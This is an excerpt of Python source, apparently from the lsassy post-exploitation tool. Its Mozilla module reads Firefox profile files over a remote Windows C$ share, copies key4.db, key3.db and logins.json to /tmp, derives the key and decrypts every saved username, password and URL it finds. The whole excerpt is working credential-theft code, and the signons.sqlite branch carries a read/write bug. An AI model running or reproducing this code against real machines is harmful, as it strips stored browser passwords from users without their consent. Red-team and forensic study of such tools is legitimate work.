...
from lsassy.dpapi.crypto.pyDES import triple_des, CBC
from lsassy.dpapi.crypto.pyaes import AESModeOfOperationCBC
...
class Mozilla(ModuleInfo):
    ...
    def get_firefox_profiles(self, directory):
        ...
        try:
            with self.impacketfile.open("C$", directory, 'profiles.ini', timeout=0) as handle:
                logging.success(f"Firefox profile exists!")

                cp.read_string(handle.read(handle.size()).decode('utf-8'))
            ...
            logging.debug(u'An error occurred while reading profiles.ini: {}'.format(e))
        return profile_list
    ...
    def get_key(self, profile):
        ...
        try:
            ...
            with self.impacketfile.open("C$", profile, 'key4.db', timeout=0) as handle:
                content = handle.read(handle.size())
                handle.close()
                with open('/tmp/key4.db', 'wb') as f:
                    f.write(content)
                if content:
                    conn = sqlite3.connect('/tmp/key4.db')  # Firefox 58.0.2 / NSS 3.35 with key4.db in SQLite
                    c = conn.cursor()
        ...
        try:
            with self.impacketfile.open("C$", profile, 'key3.db', timeout=0) as handle:
                content = handle.read(handle.size())
                if content:
                    with open('/tmp/key3.db', 'wb') as f:
                        f.write(content)
                    key_data = self.read_bsddb('/tmp/key3.db')
    ...
    def read_bsddb(self, name):
        ...
        with open(name, 'rb') as f:
            ...
            if magic != 0x61561:
                logging.debug(u'Bad magic number')
                return False

            version = self.get_long_be(header, 4)
            if version != 2:
                logging.debug(u'Bad version !=2 (1.85)')
                return False
    ...
    def extract_secret_key(self, key_data, global_salt, master_password, entry_salt):
        ...
        salt_len = priv_key_entry[1]
        name_len = priv_key_entry[2]
    ...
    def get_login_data(self, profile):
        ...
        try:
            with self.impacketfile.open("C$", profile, 'signons.sqlite', timeout=0) as f:
                with open('/tmp/signons.sqlite') as g:
                    g.write(f.read())
                    conn = sqlite3.connect('/tmp/signons.sqlite')
                    c = conn.cursor()
                    for row in c:
                        enc_username = row[6]
                        enc_password = row[7]
                        logins.append(
                            (self.decode_login_data(enc_username), self.decode_login_data(enc_password), row[1]))
        except Exception as e:
            try:
                with self.impacketfile.open("C$", profile, 'logins.json', timeout=0) as f:
                    logging.info("Found logins.json")
                    loginf = f.read(f.size())
                    if loginf:
    ...
    def manage_masterpassword(self, master_password=b'', key_data=None, new_version=True):
        ...
        if not global_salt:
            logging.debug(u'Master Password is used !')
            return '', '', ''
    ...
    def run(self):
        ...
        """
        pwd_found = []
        user_path = self.path.format(**constant.profile).replace("{user}", self.user)

        for profile in self.get_firefox_profiles(user_path):
                    ...
                    for user, passw, url in credentials:
                        try:
                            pwd_found.append(Credential(
                                username=self.decrypt(key=key, iv=user[1], ciphertext=user[2]).decode('utf-8'),
                                password=self.decrypt(key=key, iv=passw[1], ciphertext=passw[2]).decode('utf-8'),
                                data={"URL": url}
                            ))
                        except Exception:
                            logging.debug(u'An error occured decrypting the password: {error}'.format(
                                error=traceback.format_exc()))
            else:
                logging.debug(u'Database empty')
